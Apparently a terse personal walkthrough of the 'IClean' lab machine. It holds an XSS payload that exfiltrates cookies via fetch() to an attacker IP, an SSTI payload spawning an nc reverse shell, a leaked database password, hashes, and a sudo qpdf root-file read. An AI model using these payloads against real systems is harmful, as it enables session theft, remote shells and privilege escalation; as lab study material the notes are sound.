rustscan -r 1-65535 -a 10.10.11.12 -- -sV -Pn -A

![[Iclean image.png]]

![[Iclean image 1.png]]

Directory Enumerate

feroxbuster --url http://10.10.11.12/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60 -C 400,500 -k

Nothing

wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.12 -H 'Host: FUZZ.10.10.11.12' -t 50 --hc 302

Browser Access

![[Iclean image 2.png]]

View page souce

![[Iclean image 3.png]]

echo "10.10.11.12 capiclean.htb" > /etc/hosts

feroxbuster --url http://capiclean.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60 -C 400,500 -k

Browser Access

![[Iclean image 4.png]]

![[Iclean image 5.png]]

![[Iclean image 6.png]]

sqlmap -u http://capiclean.htb/login

Nothing

\<img src=x onerror=fetch(“http://ATTACK_IP:4444/"+document.cookie);>

![[Iclean image 7.png]]

%3Cimg%20src%3Dx%20onerror%3Dfetch(%22http%3A%2F%2F10.10.14.120%3A8000%2F%22%2Bdocument.cookie)%3B%3E

![[Iclean image 8.png]]

![[Iclean image 9.png]]

session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZiwltA.AhQdAQK7cxhTzMj9Mfv_T_8k-HQ HTTP/1.1

![[Iclean image 10.png]]

![[Iclean image 11.png]]

![[Iclean image 12.png]]

![[Iclean image 13.png]]

![[Iclean image 14.png]]

![[Iclean image 15.png]]

http://capiclean.htb/static/qr_code/qr_code_8783666350.png

![[Iclean image 16.png]]

http%3A%2F%2Fcapiclean.htb%2Fstatic%2Fqr_code%2Fqr_code_8783666350.png

![[Iclean image 17.png]]

invoice_id=&form_type=scannable_invoice&qr_link={{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.120%204444%20%3E%2Ftmp%2Ff")|attr("read")()}}

![[Iclean image 18.png]]

Discover applications that use database IDs and passwords

![[Iclean image 19.png]]

![[Iclean image 20.png]]

\# Database Configuration

db_config = {

'host': '127.0.0.1',

'user': 'iclean',

'password': 'pxCsmnGLckUb',

'database': 'capiclean'

}

cat /etc/passwd

![[Iclean image 21.png]]

![[Iclean image 22.png]]

![[Iclean image 23.png]]

0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa

![[Iclean image 24.png]]

simple and clean

![[Iclean image 25.png]]

![[Iclean image 26.png]]

84db28fa6406bbc05e424f40cff73d68

![[Iclean image 27.png]]

sudo /usr/bin/qpdf --empty /tmp/root.txt --qpdf --add-attachment /root/root/txt --

![[Iclean image 28.png]]

![[Iclean image 29.png]]

32c16f1e63310237d4c0c6795582a0f6